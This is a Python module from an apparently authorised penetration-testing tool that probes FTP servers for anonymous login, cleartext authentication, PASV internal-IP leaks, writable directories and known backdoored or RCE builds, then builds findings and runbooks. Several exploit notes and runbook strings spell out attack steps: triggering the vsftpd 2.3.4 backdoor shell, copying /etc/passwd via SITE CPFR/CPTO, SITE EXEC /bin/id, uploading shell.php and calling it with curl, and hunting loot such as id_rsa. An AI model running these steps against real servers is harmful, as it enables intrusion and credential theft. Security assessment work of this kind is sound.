"""Deep FTP enumeration + vulnerability identification (stdlib only).

Modelled on recce/smb.py. Two layers:

  * **Credential-free (airgapped, stdlib):** a control-channel probe reads the
    banner (→ product/version, which feeds the offline CVE DB and a small
    known-backdoor map), tries an **anonymous** login, and inspects **FEAT** to see
    whether the control channel can be encrypted (AUTH TLS / FTPS) or authentication
    is unavoidably **cleartext**.
  * **With an anonymous or credentialed session:** a reversible **writable-
    directory proof** (STOR a marker file, then DELE it - nothing left behind), and
    a directory listing.

Everything positive becomes a finding that folds into the main severity totals,
the Vulnerabilities sheet, the write-ups, and a dedicated **FTP** workbook tab.
Airgapped, stdlib only (the write proof uses `ftplib`).
"""
from __future__ import annotations

import ipaddress
import re
import socket

from ..core import proxy
from ..core.models import Host, Port
from .svccommon import finding_builder

_DEFAULT_PORT = 21
_TIMEOUT = 6.0
_PROBE_MARK = "recce_ftp_probe"

# HELP / SITE HELP verbs whose mere presence is diagnostic:
#   CPFR/CPTO  -> ProFTPD mod_copy (CVE-2015-3306 / CVE-2019-12815 class)
#   EXEC       -> wu-ftpd SITE EXEC (arbitrary command exec once authenticated)
#   CHMOD/INDEX-> wu-ftpd/ProFTPD extensions that fan out to file-permission / path
#                 abuse once a session exists.
_DANGEROUS_SITE_VERBS = ("CPFR", "CPTO", "EXEC", "CHMOD", "INDEX")

# 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)   RFC 959 Sec 4.1.2.
_PASV_RX = re.compile(r"227[^(]*\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,"
                      r"\s*(\d{1,3})\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*\)")

# Banner substring -> (severity, title, detail, cwes, kind). Deliberately narrow:
# only the well-known, high-confidence FTP backdoors/RCEs.
_KNOWN_BAD = [
    (re.compile(r"vsftpd 2\.3\.4", re.I), (
        "critical", "vsFTPd 2.3.4 backdoor (CVE-2011-2523)",
        "The banner advertises vsFTPd 2.3.4 - a build whose source was trojaned: a "
        "username ending in ':)' opens a root shell on TCP 6200. Instant pre-auth RCE.",
        ["CWE-506"], "ftp_backdoor",
        "metasploit unix/ftp/vsftpd_234_backdoor (or connect a USER ending ':)' then "
        "nc <ip> 6200)")),
    (re.compile(r"ProFTPD 1\.3\.3c", re.I), (
        "critical", "ProFTPD 1.3.3c backdoor (CVE-2010-4221 era)",
        "ProFTPD 1.3.3c shipped from a compromised mirror with a backdoor granting "
        "command execution.", ["CWE-506"], "ftp_backdoor",
        "metasploit unix/ftp/proftpd_133c_backdoor")),
    (re.compile(r"ProFTPD 1\.3\.[0-5]", re.I), (
        "high", "ProFTPD mod_copy RCE (CVE-2015-3306)",
        "ProFTPD 1.3.5/pre versions expose SITE CPFR/CPTO (mod_copy) to unauthenticated "
        "clients, letting a remote attacker copy files and achieve RCE.",
        ["CWE-78"], "ftp_rce",
        "SITE CPFR/CPTO via the public CVE-2015-3306 PoC, or metasploit "
        "proftpd_modcopy_exec")),
    # ProFTPD mod_copy re-break in the 1.3.6 / 1.3.7 line -- same CPFR/CPTO
    # unauth-file-copy primitive, different CVE (2019-12815). (?!\d) prevents
    # a hypothetical '1.3.71' from being mis-classified as vulnerable.
    (re.compile(r"ProFTPD\s+1\.3\.[67](?!\d)", re.I), (
        "high", "ProFTPD mod_copy RCE re-break (CVE-2019-12815)",
        "ProFTPD 1.3.6 / 1.3.7 re-introduced the SITE CPFR/CPTO unauthenticated "
        "file-copy path via mod_copy (CVE-2019-12815). Copying into a web-served "
        "path yields immediate RCE where the FTP root overlaps a web root.",
        ["CWE-78", "CWE-284"], "ftp_rce",
        "SITE CPFR/CPTO via the public CVE-2019-12815 PoC")),
    # CrushFTP < 10.7.1 / < 11.1.0 -- unauth VFS escape into server-side template
    # engine leading to RCE. Regex anchors on the specific vulnerable ranges so a
    # patched banner ('CrushFTP 10.7.1' / '11.1.0') does NOT match.
    (re.compile(r"CrushFTP.*?(?<![\d.])(?:10\.[0-6]\.\d|10\.7\.0|11\.0\.\d)(?!\d)",
                re.I), (
        "critical", "CrushFTP VFS escape RCE (CVE-2024-4040)",
        "CrushFTP versions prior to 10.7.1 / 11.1.0 allow an unauthenticated VFS "
        "escape leading to server-side template injection and remote code execution "
        "(CVE-2024-4040) -- observed in the wild.",
        ["CWE-22", "CWE-94"], "ftp_rce",
        "public CVE-2024-4040 PoC (GET / with a crafted template; then chain "
        "to RCE). Also test CVE-2023-43177 against the same build.")),
    # SolarWinds Serv-U <= 15.2.3 (pre hotfix 2) -- memory-corruption RCE in the
    # SSH sub-service. Anchored to the vulnerable ranges only.
    (re.compile(r"Serv-U.*?(?<![\d.])(?:1[0-4]\.\d|15\.[01]\.\d|15\.2\.[0-2])(?!\d)",
                re.I), (
        "critical", "SolarWinds Serv-U pre-auth RCE (CVE-2021-35211)",
        "Serv-U versions prior to 15.2.3 hotfix 2 contain a memory-corruption "
        "vulnerability in the SSH sub-service permitting unauthenticated remote "
        "code execution (CVE-2021-35211). Older builds are also vulnerable to "
        "CVE-2024-28995 path traversal.",
        ["CWE-787"], "ftp_rce",
        "public CVE-2021-35211 exploit against the SSH sub-service; probe "
        "CVE-2024-28995 with an encoded '..' in the file download URL.")),
    # Progress WS_FTP Server -- unauth deserialisation in the Ad Hoc Transfer
    # module (CVE-2023-40044). Vulnerable prior to 8.7.4 / 8.8.2.
    (re.compile(r"WS_FTP.*?(?<![\d.])(?:[1-7]\.\d|8\.[0-6]\.\d|8\.7\.[0-3]|8\.8\.[01])"
                r"(?!\d)", re.I), (
        "critical", "Progress WS_FTP Server pre-auth RCE (CVE-2023-40044)",
        "Progress WS_FTP Server versions prior to 8.7.4 / 8.8.2 expose an "
        "unauthenticated .NET deserialisation flaw in the Ad Hoc Transfer module "
        "yielding remote code execution (CVE-2023-40044).",
        ["CWE-502"], "ftp_rce",
        "public CVE-2023-40044 PoC / metasploit exploit/windows/ftp/ws_ftp_rce")),
]


def is_ftp(port: Port) -> bool:
    if not port.is_open:
        return False
    if port.portid == _DEFAULT_PORT:
        return True
    return "ftp" in f"{port.service} {port.product}".lower()


# --- credential-free control-channel probe (stdlib) -----------------------------

def _read_resp(sock, timeout: float) -> str:
    """Read a (possibly multi-line) FTP reply, ending at a 'NNN ' final line."""
    sock.settimeout(timeout)
    buf = b""
    try:
        while len(buf) < 65535:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            # Final line looks like '250 done\r\n' (code then a space, not a dash).
            lines = buf.split(b"\r\n")
            last = lines[-2] if len(lines) >= 2 and lines[-1] == b"" else lines[-1]
            if re.match(rb"^\d{3} ", last):
                break
    except OSError:
        pass
    return buf.decode("latin-1", "replace")


def _cmd(sock, line: str, timeout: float) -> str:
    try:
        sock.sendall(line.encode() + b"\r\n")
    except OSError:
        return ""
    return _read_resp(sock, timeout)


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict | None:
    """Banner + anonymous-login + AUTH-TLS posture. No credentials. Returns None if
    the port didn't speak FTP."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            hello = _read_resp(s, timeout)
            if not re.search(r"^220", hello.strip()[:3]) and "220" not in hello[:8]:
                return None
            # A multi-line 220 greeting often carries the product/version on a LATER
            # line (e.g. "220-Welcome\r\n220 ProFTPD 1.3.5 ready"). Join every 220
            # line so the known-backdoor match sees the whole greeting, not just the
            # first line.
            parts = [m.group(1).strip() for m in
                     re.finditer(r"(?m)^220[ -](.*)$", hello)]
            banner = " ".join(p for p in parts if p).strip()
            feat = _cmd(s, "FEAT", timeout)
            auth_tls = bool(re.search(r"\bAUTH\s+TLS\b|\bAUTH\s+SSL\b|\bFTPS\b",
                                      feat, re.I))
            # Anonymous login.
            r1 = _cmd(s, "USER anonymous", timeout)
            anon = False
            if r1.strip().startswith("331") or "230" in r1[:4]:
                r2 = _cmd(s, "PASS recce@example.com", timeout)
                anon = r2.strip().startswith("230") or "230" in r2[:4] \
                    or r1.strip().startswith("230")
            syst = ""
            sm = re.search(r"215[ -](.*)", _cmd(s, "SYST", timeout))
            if sm:
                syst = sm.group(1).strip()
            # HELP + SITE HELP fingerprint the vendor even when the 220 banner has
            # been stripped, and enumerate dangerous SITE verbs (CPFR/CPTO indicates
            # ProFTPD mod_copy; EXEC indicates wu-ftpd). Both are read-only.
            help_body = _cmd(s, "HELP", timeout)
            site_help_body = _cmd(s, "SITE HELP", timeout)
            site_verbs = _extract_site_verbs(help_body + " " + site_help_body)
            # PASV -- the 227 reply encodes the server-chosen data-channel IP; when
            # the server sits behind NAT the returned IP is often RFC1918, leaking
            # internal topology. Send it late (some servers require login first;
            # the 530 that comes back is fine -- we only look for the 227 shape).
            pasv_ip = _parse_pasv_ip(_cmd(s, "PASV", timeout))
            _cmd(s, "QUIT", timeout)
            return {"ip": ip, "port": port, "banner": banner, "anonymous": anon,
                    "auth_tls": auth_tls, "syst": syst,
                    "pasv_ip": pasv_ip, "site_verbs": site_verbs}
    except OSError:
        return None


def _parse_pasv_ip(reply: str) -> str:
    """Extract 'h1.h2.h3.h4' from a '227 Entering Passive Mode (a,b,c,d,p1,p2)'
    reply. Returns '' when the reply is not a well-formed 227."""
    m = _PASV_RX.search(reply or "")
    if not m:
        return ""
    try:
        octets = [int(m.group(i)) for i in (1, 2, 3, 4)]
    except ValueError:
        return ""
    if any(o < 0 or o > 255 for o in octets):
        return ""
    return "{}.{}.{}.{}".format(*octets)


def _extract_site_verbs(text: str) -> list[str]:
    """Return the subset of _DANGEROUS_SITE_VERBS mentioned in HELP/SITE HELP output."""
    if not text:
        return []
    up = text.upper()
    return [v for v in _DANGEROUS_SITE_VERBS if re.search(rf"\b{v}\b", up)]


def ftp_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_ftp(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives -----------------------------------------------------------------

_NARRATIVE = {
    "anon_ftp": (
        "Anonymous FTP accepts the username 'anonymous' (or 'ftp') with any password "
        "and grants an unauthenticated session. At minimum it exposes whatever the "
        "FTP root serves - firmware, backups, configuration files, source, upload "
        "drop-boxes - to anyone on the network. Combined with a writable directory it "
        "becomes a foothold: stage tooling, poison files a victim will fetch, or (when "
        "the FTP root overlaps a web root) drop a web shell for direct RCE."),
    "cleartext_ftp": (
        "FTP authentication and data transfer happen in cleartext: the USER/PASS and "
        "every retrieved file cross the wire unencrypted. Anyone positioned to sniff "
        "the segment (ARP spoofing, a SPAN port, a compromised switch) captures valid "
        "credentials and file contents verbatim. The server advertises no AUTH "
        "TLS/FTPS option, so encryption cannot even be negotiated."),
    "writable_ftp": (
        "The FTP session can WRITE to the server. A writable FTP root is a classic "
        "foothold: where it backs a web root, upload a web shell for immediate RCE; "
        "otherwise plant trojaned downloads, overwrite served files, or stage "
        "malware for lateral movement. recce proves the write reversibly - it STORs a "
        "harmless marker file and immediately DELEtes it again."),
    "ftp_backdoor": (
        "This exact FTP build is a known-trojaned/backdoored release. The backdoor "
        "yields command execution (often a root shell) with no valid credentials - a "
        "pre-authentication remote compromise. Treat the host as fully exploitable and "
        "verify with the referenced public module in ROE."),
    "ftp_rce": (
        "This FTP build exposes an unauthenticated remote-code-execution path (e.g. "
        "ProFTPD mod_copy SITE CPFR/CPTO). A remote attacker can copy/execute files "
        "on the server without logging in - verify with the referenced PoC in ROE."),
    "ftp_pasv_internal_ip": (
        "The FTP server's 227 PASV reply encodes the data-channel IP in its "
        "(h1,h2,h3,h4,p1,p2) tuple. When that address differs from the control-"
        "channel IP AND falls in RFC1918, the server is disclosing its "
        "behind-NAT / dual-homed address - direct topology intelligence that "
        "feeds pivot and internal-scan planning."),
    "ftp_site_copy_exposed": (
        "The server's HELP / SITE HELP advertises SITE CPFR/CPTO - the ProFTPD "
        "mod_copy verb pair whose unauthenticated variant is CVE-2015-3306 / "
        "CVE-2019-12815. Even where anonymous is disabled, any authenticated "
        "session can copy arbitrary files under the server's UID; combined with "
        "a web-root overlap this is a direct RCE primitive."),
    "ftp_extra_commands_disclosed": (
        "The server's HELP / SITE HELP enumerates dangerous SITE extensions "
        "(EXEC, CHMOD, INDEX) whose presence maps the server to a specific "
        "vendor (wu-ftpd / ProFTPD) and points at follow-on primitives an "
        "authenticated attacker can use for file writes or command execution."),
}


TESTING_NARRATIVE = [
    ("1. Credential-free probe (stdlib)",
     "recce reads the FTP banner (product/version -> offline CVE DB + a known-backdoor "
     "map), tries an anonymous login, and inspects FEAT for AUTH TLS/FTPS support - so "
     "it knows whether authentication is unavoidably cleartext."),
    ("2. Vulnerability identification",
     "Anonymous login permitted -> unauthenticated access. No AUTH TLS -> cleartext "
     "credential exposure. A backdoored/RCE build (vsftpd 2.3.4, ProFTPD mod_copy) -> "
     "a critical pre-auth compromise. Each folds into the main totals and the prove "
     "engine adjudicates it."),
    ("3. Write proof",
     "For an anonymous or credentialed session recce PROVES write access reversibly: "
     "STOR a marker file, confirm it, DELE it. A confirmed write is a CONFIRMED finding "
     "with the transcript as proof."),
    ("4. Runbook",
     "The exact follow-on commands (anonymous browse/mirror, credentialed loot, the "
     "backdoor/RCE module) are staged and pre-filled."),
]


# --- findings -------------------------------------------------------------------

_finding = finding_builder("ftp", _NARRATIVE)


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_ftp(p):
                continue
            tgt = f"{h.ip}:{p.portid}"
            pr = probes.get((h.ip, p.portid)) or {}
            banner = pr.get("banner") or f"{p.product} {p.version}".strip()
            # Known-backdoor / RCE builds from the banner.
            for rx, (sev, title, detail, cwes, kind, cmd) in _KNOWN_BAD:
                if banner and rx.search(banner):
                    note = ""
                    tier = ""
                    if kind == "ftp_backdoor":
                        note = ("For vsftpd 2.3.4: nc IP 21 ; USER x:) ; PASS y ; "
                                "then in second terminal: nc IP 6200 ; id -- if "
                                "root shell, you're in. Or: msfconsole -x 'use "
                                "unix/ftp/vsftpd_234_backdoor; set RHOSTS IP; run'.")
                        tier = "t0"
                    elif kind == "ftp_rce":
                        note = ("For ProFTPD: nc IP 21 ; SITE CPFR /etc/passwd ; "
                                "SITE CPTO /tmp/recce_canary_passwd ; expect 250, "
                                "then read via anon FTP GET /tmp/recce_canary_passwd. "
                                "For CrushFTP: metasploit auxiliary/scanner/http/"
                                "crushftp_rce_cve_2024_4040.")
                        tier = "t0"
                    out.append(_finding(
                        sev, title, tgt, f"Banner: {banner}. {detail}", "metasploit",
                        cmd, "Upgrade to a vendor-clean build immediately; the current "
                        "one is compromised/vulnerable.", cwes, kind=kind,
                        exploit_note=note, depth_tier=tier))
                    break
            if pr.get("anonymous"):
                # T2 SAFE promotion: when analyze() has already run a single-shot
                # read-only LIST snapshot against the anonymous session, embed the
                # captured server-side listing as real evidence and lift the tier to
                # t2. The T1 path (no snapshot present) stays unchanged.
                anon_ev = pr.get("anon_list_evidence") or ""
                anon_entries = pr.get("anon_list_entries") or []
                anon_total = pr.get("anon_list_total")
                anon_tier = "t2" if anon_ev else "t1"
                anon_detail = (
                    "Anonymous login permitted: the server returned a 230 to "
                    "anonymous/PASS during recce's probe. It grants an unauthenticated "
                    "session to the FTP root.")
                if anon_ev:
                    shown = len(anon_entries)
                    total_note = (f" of {anon_total}" if isinstance(anon_total, int)
                                  and anon_total > shown else "")
                    anon_detail += (
                        "\n\nT2 evidence -- server-side LIST snapshot captured after "
                        f"the anonymous 230 (top {shown}{total_note} entr"
                        f"{'y' if shown == 1 else 'ies'}, read-only, no writes):\n\n"
                        + anon_ev)
                out.append(_finding(
                    "high", "Anonymous FTP login allowed", tgt,
                    anon_detail,
                    "ftp / nmap",
                    "ftp <ip>   # user 'anonymous', any password; or nmap --script "
                    "ftp-anon -p21 <ip>",
                    "Disable anonymous access unless the content is deliberately public "
                    "and read-only.", ["CWE-306", "CWE-287"], kind="anon_ftp",
                    exploit_note=(
                        "wget -m --no-passive ftp://anonymous:recce@IP:21/ ; or "
                        "lftp -u anonymous, ftp://IP -e 'find; quit' -- grep for "
                        "backup.tar, .git, .aws, id_rsa"),
                    depth_tier=anon_tier))
            # PASV response leaks the server-chosen data-channel IP; when it's
            # RFC1918 and differs from the control-channel IP, the server is
            # disclosing internal topology (RFC 959 Sec 4.1.2 / CWE-200).
            pasv_ip = pr.get("pasv_ip") or ""
            if pasv_ip and pasv_ip != h.ip:
                try:
                    is_private = ipaddress.ip_address(pasv_ip).is_private
                except ValueError:
                    is_private = False
                if is_private:
                    out.append(_finding(
                        "medium", "FTP PASV response leaks internal IP", tgt,
                        f"PASV returned data-channel address {pasv_ip}, distinct "
                        f"from the control-channel IP {h.ip}. The server is behind "
                        "NAT or dual-homed and is disclosing its private-network "
                        "address to any client that issues PASV.",
                        "ftp",
                        "ftp <ip> <port>   # after login: 'passive' + 'ls' -- the "
                        "227 reply carries the leaked IP",
                        "Rewrite PASV replies at the NAT/edge or bind the server so "
                        "it returns the routable address (e.g. vsftpd "
                        "'pasv_address', ProFTPD 'MasqueradeAddress').",
                        ["CWE-200"], kind="ftp_pasv_internal_ip",
                        exploit_note=(
                            "Add leaked IP to scan sweep: nmap -sT -p- "
                            "<internal_ip> from a foothold; also consult ipam "
                            "DB with the leaked subnet."),
                        depth_tier="t2"))
            # HELP / SITE HELP dangerous-verb fingerprint. CPFR/CPTO -> mod_copy
            # (CVE-2015-3306 / CVE-2019-12815 primitive, exposed regardless of what
            # the 220 banner claims). EXEC/CHMOD/INDEX -> wu-ftpd / ProFTPD
            # extensions with follow-on file-write / command-exec surface.
            site_verbs = pr.get("site_verbs") or []
            if site_verbs:
                copy_exposed = "CPFR" in site_verbs or "CPTO" in site_verbs
                out.append(_finding(
                    "medium",
                    "FTP SITE mod_copy verbs exposed" if copy_exposed
                    else "FTP HELP/SITE HELP discloses extra command surface",
                    tgt,
                    "HELP / SITE HELP output enumerates dangerous SITE verbs: "
                    f"{', '.join(site_verbs)}."
                    + (" CPFR/CPTO indicates the ProFTPD mod_copy module -- an "
                       "authenticated (and in patched-banner-but-unpatched-code "
                       "builds, unauthenticated) attacker can copy arbitrary "
                       "files (CVE-2015-3306 / CVE-2019-12815)." if copy_exposed
                       else " These verbs point at wu-ftpd / ProFTPD extensions "
                       "with follow-on file-permission or command-execution "
                       "primitives once a session is established."),
                    "ftp",
                    "ftp <ip> <port>   # then 'quote SITE HELP'; if CPFR listed: "
                    "'quote SITE CPFR /etc/passwd' + 'quote SITE CPTO /tmp/out'",
                    "Restrict SITE verbs in the FTP daemon config (ProFTPD: "
                    "unload mod_copy or gate <Limit SITE_CPFR SITE_CPTO>; "
                    "wu-ftpd: disable SITE EXEC).",
                    ["CWE-200", "CWE-78"] if copy_exposed else ["CWE-200"],
                    kind="ftp_site_copy_exposed" if copy_exposed
                    else "ftp_extra_commands_disclosed",
                    exploit_note=(
                        "ftp IP ; anonymous / any ; quote SITE CPFR /etc/passwd ; "
                        "quote SITE CPTO /tmp/recce_probe ; get /tmp/recce_probe "
                        "/tmp/local_probe -- verify contents."
                        if copy_exposed else
                        "ftp IP ; USER u/PASS p ; quote SITE EXEC /bin/id -- "
                        "wu-ftpd runs the command as the daemon UID."),
                    depth_tier="t1" if copy_exposed else "t0"))
            # Not gated on anonymous: an auth-REQUIRED server with no AUTH TLS is the
            # common cleartext-credential case and must still raise this finding.
            if pr.get("auth_tls") is False:
                out.append(_finding(
                    "medium", "FTP authentication is cleartext (no AUTH TLS)", tgt,
                    "The server advertises no AUTH TLS/FTPS in FEAT, so credentials "
                    "and file transfers cross the network unencrypted and are "
                    "sniffable.", "wireshark / tcpdump",
                    "tcpdump -i <iface> 'tcp port 21'   # USER/PASS appear in clear",
                    "Require FTPS (explicit AUTH TLS) or replace FTP with SFTP/SCP.",
                    ["CWE-319"], kind="cleartext_ftp",
                    exploit_note=(
                        "tcpdump -i any -A 'tcp port 21 and host IP' -- grep "
                        "'PASS '"),
                    depth_tier="t0"))
    return out


# --- runbooks -------------------------------------------------------------------

def _fill(text: str, ip: str, port: int, creds: dict | None) -> str:
    creds = creds or {}
    return (text.replace("<ip>", ip).replace("<port>", str(port))
            .replace("<user>", creds.get("user") or "<user>")
            .replace("<pass>", creds.get("secret") or "<pass>"))


def credfree_runbook(ip: str, port: int) -> list[dict]:
    steps = [
        ("recon", "nmap NSE", "nmap -p<port> --script ftp-anon,ftp-syst,ftp-bounce,"
         "ftp-vsftpd-backdoor,ftp-proftpd-backdoor <ip>",
         "Anonymous access, system type, bounce, known backdoors."),
        ("recon", "anonymous", "ftp <ip> <port>   # user 'anonymous', any password",
         "Browse the FTP root without credentials."),
        ("loot", "mirror", "wget -m --no-passive ftp://anonymous:recce@<ip>:<port>/",
         "Recursively mirror everything the anonymous session can read."),
    ]
    return [{"phase": ph, "tool": t, "command": _fill(c, ip, port, None), "why": w}
            for ph, t, c, w in steps]


def cred_runbook(ip: str, port: int, creds: dict | None) -> list[dict]:
    steps = [
        ("enumerate", "lftp", "lftp -u <user>,<pass> ftp://<ip>:<port> -e 'find; quit'",
         "Recursively index every readable path with credentials."),
        ("loot", "mirror", "lftp -u <user>,<pass> ftp://<ip>:<port> -e 'mirror / loot; quit'",
         "Pull the whole tree for offline secret hunting."),
        ("escalate", "upload", "put shell.php   # if the FTP root backs a web root -> RCE",
         "Where the FTP root overlaps a web root, an upload is direct code execution."),
    ]
    return [{"phase": ph, "tool": t, "command": _fill(c, ip, port, creds), "why": w}
            for ph, t, c, w in steps]


# --- live write proof (stdlib ftplib) -------------------------------------------

def prove_writable(ip: str, port: int = _DEFAULT_PORT, creds: dict | None = None,
                   timeout: float = _TIMEOUT) -> dict:
    """Reversibly prove the FTP session can write: STOR a marker file, then DELE it.
    Returns {writable, evidence, error}. Never leaves the marker behind."""
    import ftplib
    import io
    creds = creds or {}
    user = creds.get("user") or "anonymous"
    password = creds.get("secret") or "recce@example.com"
    marker = f"{_PROBE_MARK}.txt"
    log = []
    ftp = None
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port, timeout=timeout)
        log.append(ftp.getwelcome())
        log.append(ftp.login(user, password))
        stor = ftp.storbinary(f"STOR {marker}", io.BytesIO(b"recce-ftp-write-proof\n"))
        log.append(f"STOR {marker}: {stor}")
        wrote = str(stor).startswith("226") or str(stor).startswith("250")
        cleanup_ok = True
        if wrote:
            cleanup_ok = False
            for _ in range(2):                             # retry the reverting delete
                try:
                    resp = ftp.delete(marker)
                    log.append(f"DELE {marker}: {resp}")
                    cleanup_ok = str(resp).startswith("250")
                    break
                except ftplib.all_errors as e:
                    log.append(f"DELE {marker}: {e}")
            if not cleanup_ok:
                log.append(f"[!] cleanup: could not delete {marker} - REMOVE IT "
                           "MANUALLY (the write proof left the marker on the server).")
        return {"writable": bool(wrote), "evidence": "\n".join(log),
                "cleanup_ok": cleanup_ok, "marker": marker, "error": None}
    except Exception as e:  # noqa: BLE001 - ftplib.all_errors + socket errors
        return {"writable": False, "evidence": "\n".join(log),
                "cleanup_ok": True, "error": str(e)}
    finally:
        if ftp is not None:
            try:
                ftp.quit()
            except Exception:  # noqa: BLE001
                try:
                    ftp.close()
                except Exception:  # noqa: BLE001
                    pass


# --- T2 anonymous read-foothold snapshot ---------------------------------------

_ANON_LIST_MAX = 20


def anon_list_snapshot(ip: str, port: int = _DEFAULT_PORT,
                       timeout: float = _TIMEOUT,
                       max_lines: int = _ANON_LIST_MAX) -> dict:
    """T2 SAFE evidence: after a successful anonymous USER/PASS (as already
    detected by :func:`probe`), open a single fresh FTP session, log in
    anonymously, and issue one **LIST** on the top-level directory - capturing
    the real server-side directory listing as evidence of an unauthenticated
    read foothold. Read-only, single-shot, bounded timeout - no writes, no
    state change, no CWD navigation past the login-default directory.

    Returns ``{ok, entries, total, evidence, error}``. On any failure the
    snapshot degrades to ``ok=False`` and the caller keeps the T1 emission
    unchanged; recce never elevates the tier without server-side evidence.
    """
    import ftplib
    scaled = proxy.scaled(timeout)
    lines: list[str] = []
    log: list[str] = []
    ftp_client = None
    try:
        ftp_client = ftplib.FTP()
        ftp_client.connect(ip, port, timeout=scaled)
        welcome = (ftp_client.getwelcome() or "").strip()
        if welcome:
            log.append(welcome)
        login_reply = str(ftp_client.login("anonymous", "recce@example.com"))
        log.append(login_reply.strip())
        if not login_reply.lstrip().startswith("230"):
            return {"ok": False, "entries": [], "total": 0,
                    "evidence": "\n".join(log),
                    "error": "anonymous login not accepted"}
        try:
            ftp_client.retrlines("LIST", lines.append)
        except ftplib.all_errors as e:
            log.append(f"LIST error: {e}")
        entries = lines[:max_lines]
        header = (f"LIST (top {len(entries)} of {len(lines)} entries):"
                  if len(lines) > len(entries)
                  else f"LIST ({len(entries)} entries):")
        evidence = "\n".join(log + [header] + entries)
        return {"ok": True, "entries": entries, "total": len(lines),
                "evidence": evidence, "error": None}
    except Exception as e:  # noqa: BLE001 - ftplib.all_errors + socket errors
        return {"ok": False, "entries": [], "total": 0,
                "evidence": "\n".join(log), "error": str(e)}
    finally:
        if ftp_client is not None:
            try:
                ftp_client.quit()
            except Exception:  # noqa: BLE001
                try:
                    ftp_client.close()
                except Exception:  # noqa: BLE001
                    pass


def write_proof_finding(ip: str, port: int, proof: dict,
                        creds: dict | None) -> dict | None:
    if not proof.get("writable"):
        return None
    who = "anonymous" if not (creds and creds.get("user")) else creds["user"]
    reversible = ("then DELEting it (fully reversible)"
                  if proof.get("cleanup_ok", True) else
                  f"then attempting to DELE it - CLEANUP FAILED, the marker "
                  f"'{proof.get('marker', _PROBE_MARK)}' is still on the server; "
                  "remove it manually")
    return _finding(
        "high", "Writable FTP directory (proven)", f"{ip}:{port}",
        f"recce PROVED write access as {who} by STORing a marker file {reversible}:"
        "\n\n" + (proof.get("evidence") or ""),
        "ftp / web shell",
        "put shell.php   # if the FTP root backs a web root this is direct RCE",
        "Remove write access for anonymous/low-priv principals; separate the FTP root "
        "from any web root.", ["CWE-732", "CWE-434"], kind="writable_ftp",
        exploit_note=(
            "ftp IP ; then: put shell.php ; then: curl "
            "http://IP/shell.php?cmd=id -- if FTP root != web root, put "
            "webshell in every candidate path (uploads/, public/, htdocs/)."),
        depth_tier="t2")


# --- proof screenshot -----------------------------------------------------------

def proof_html(command, output, banner: str = "") -> str:
    from ..services.db import mssql
    return mssql.proof_html(command, output, prompt="ftp> ", banner=banner)


# --- top-level analyze ----------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """FTP findings -> {ip: [Vuln]} (source='ftp')."""
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "ftp", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    """Full FTP analysis. Returns {targets, findings, runbooks, stats}.
    `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe."""
    from . import svcprobe
    targets = ftp_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["banner"] = pr.get("banner", "")
                t["anonymous"] = pr.get("anonymous", False)
                t["auth_tls"] = pr.get("auth_tls")
                t["syst"] = pr.get("syst", "")
                t["pasv_ip"] = pr.get("pasv_ip", "")
                t["site_verbs"] = pr.get("site_verbs", [])
                # RFC 959 has no transport crypto — any reachable FTP
                # endpoint is a cleartext-auth exposure; AUTH TLS being
                # advertised does not remove the plain-socket USER/PASS
                # path. Feed the cross-service reader.
                from ..core.cleartext_creds import record_cleartext_auth
                for _h in hosts:
                    if _h.ip == t["ip"]:
                        record_cleartext_auth(_h, t["port"], "ftp",
                                              "password", source="ftp:probe")
                        break
                # T2 SAFE promotion for anon_ftp: when the T1 probe already
                # observed a 230 to anonymous, follow up with one read-only
                # LIST snapshot for real server-side evidence. Bounded, single
                # shot, additive - failures leave the T1 tier intact.
                if pr.get("anonymous"):
                    snap = anon_list_snapshot(t["ip"], t["port"])
                    if snap.get("ok"):
                        pr["anon_list_evidence"] = snap.get("evidence") or ""
                        pr["anon_list_entries"] = snap.get("entries") or []
                        pr["anon_list_total"] = snap.get("total") or 0
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": credfree_runbook(t["ip"], t["port"]),
                 "credentialed": cred_runbook(t["ip"], t["port"], creds)}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
